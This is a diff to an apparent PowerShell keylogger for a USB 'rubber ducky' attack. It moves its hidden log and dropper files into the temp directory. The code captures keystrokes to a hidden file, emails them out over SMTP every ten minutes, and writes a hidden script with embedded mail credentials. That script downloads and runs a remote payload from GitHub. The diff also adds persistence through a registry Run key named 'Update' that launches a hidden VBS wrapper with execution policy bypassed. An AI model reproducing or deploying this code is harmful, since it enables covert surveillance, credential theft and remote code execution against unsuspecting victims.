@@ -18,7 +18,7 @@ $functions =  {
 "@ 
         
         $getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru
-        $filename = "$env:windir\key.log"
+        $filename = "$env:temp\key.log"
         fsutil file createnew $filename 0
         (Get-ChildItem $filename).Attributes = "Hidden","System"
         while ($true) 
@@ -98,7 +98,7 @@ $functions =  {
             $password
         )
         
-        $filename = "$env:windir\key.log"
+        $filename = "$env:temp\key.log"
         while($true) 
         { 
             Start-Sleep -Seconds 600
@@ -233,7 +233,7 @@ $functions =  {
                 $msg.Body = $pastevalue
                 $smtp.Send($msg)
 
-                $filename = "$env:windir\key.log"
+                $filename = "$env:temp\key.log"
                 rm -force $filename
                 fsutil file createnew $filename 0
                 (Get-ChildItem $filename).Attributes = "Hidden","System"
@@ -256,21 +256,23 @@ $functions =  {
         while($true)
         {
             $modulename = "a.ps1"
-            $modulenamepath = "$env:windir\$modulename"
+            $modulenamepath = "$env:temp\$modulename"
             
             if(-Not ([System.IO.File]::Exists($modulenamepath)))
             {
-                Out-File -InputObject 'do { $ping = test-connection -comp google.com -count 1 -Quiet; Start-Sleep -Seconds 10 } until ($ping)' -Force $env:windir\$modulename
-                Out-File -InputObject '$username = "ryouichi.mikami.hirata"' -Append -NoClobber $env:windir\$modulename
-                Out-File -InputObject '$password = "toryfuhbtedjzxig"' -Append -NoClobber $env:windir\$modulename
-                Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/keys2.ps1"))' -Append -NoClobber $env:windir\$modulename
-                Out-File -InputObject 'Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList "$username", "$password"' -Append -NoClobber $env:windir\$modulename
-                $modulenamefile = Get-Item $env:windir\$modulename
+                Out-File -InputObject 'do { $ping = test-connection -comp google.com -count 1 -Quiet; Start-Sleep -Seconds 10 } until ($ping)' -Force $env:temp\$modulename
+                Out-File -InputObject '$username = "ryouichi.mikami.hirata"' -Append -NoClobber $env:temp\$modulename
+                Out-File -InputObject '$password = "toryfuhbtedjzxig"' -Append -NoClobber $env:temp\$modulename
+                Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/keys2.ps1"))' -Append -NoClobber $env:temp\$modulename
+                Out-File -InputObject 'Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList "$username", "$password"' -Append -NoClobber $env:temp\$modulename
+                $modulenamefile = Get-Item $env:temp\$modulename
                 $modulenamefile.Attributes = "Hidden","System"
             }
-            
-            $cortana = Get-AppxPackage | Select-String "Microsoft.Windows.Cortana"
-            New-Item -Path HKCU:Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\$cortana -Value "C:\windows\system32\cmd.exe /C powershell -noexit -nologo -WindowStyle Hidden -executionpolicy bypass -command $env:windir\$modulename" -force
+
+            $vbsname = "a.vbs"
+            New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value "C:\windows\system32\cmd.exe /C powershell -noexit -nologo -WindowStyle Hidden -executionpolicy bypass -command $env:temp\$vbsname" -force
+            echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:temp\$vbsname
+            echo "objShell.run(`"powershell -noexit -WindowStyle Hidden -executionpolicy bypass -file $env:temp\a.ps1`")" >> $env:temp\$vbsname
             
             Start-Sleep -Seconds 5
         }
